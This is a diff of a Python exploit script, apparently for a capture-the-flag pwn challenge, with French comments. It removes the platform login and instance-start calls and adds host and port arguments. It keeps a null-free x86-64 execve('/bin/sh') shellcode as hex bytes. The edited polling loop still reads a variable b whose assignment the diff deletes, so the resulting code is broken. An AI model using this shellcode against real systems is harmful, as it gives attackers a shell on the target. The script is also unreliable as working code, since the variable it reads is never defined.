@@ -5,16 +5,10 @@
 #
 import sys, json, re, time, socket, struct
 sys.stdout.reconfigure(encoding="utf-8", errors="replace")
-sys.path.insert(0, r".")
-from cylab2 import CyLab
 
-cy = CyLab(delay=0.8)
-cy.login()
-cy.req("PUT", "/api/challenges/126/instance/?source=library")
 host = port = None
 for _ in range(12):
     time.sleep(2)
-    st, b = cy.req("GET", "/api/challenges/126/instance/")
     d = json.loads(b) if b.startswith("{") else {}
     if d.get("status") == "RUNNING":
         m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
@@ -23,6 +17,14 @@ for _ in range(12):
             break
 print("cible:", host, port)
 # execve("/bin/sh", 0, 0) x86-64, sans 0x00 ni 0x0a
+
+# Service : demarrer l'instance depuis la plateforme du challenge, puis passer
+# l'hote et le port (ou l'URL) en argument de ce script.
+_A = sys.argv[1:]
+HOST = _A[0] if len(_A) > 0 else ""
+PORT = int(_A[1]) if len(_A) > 1 else 0
+url = _A[0] if _A else ""
+
 SC = bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")
 print("shellcode:", len(SC), "octets | 0x0a:", b"\n" in SC, "| 0x00:", b"\x00" in SC)
 
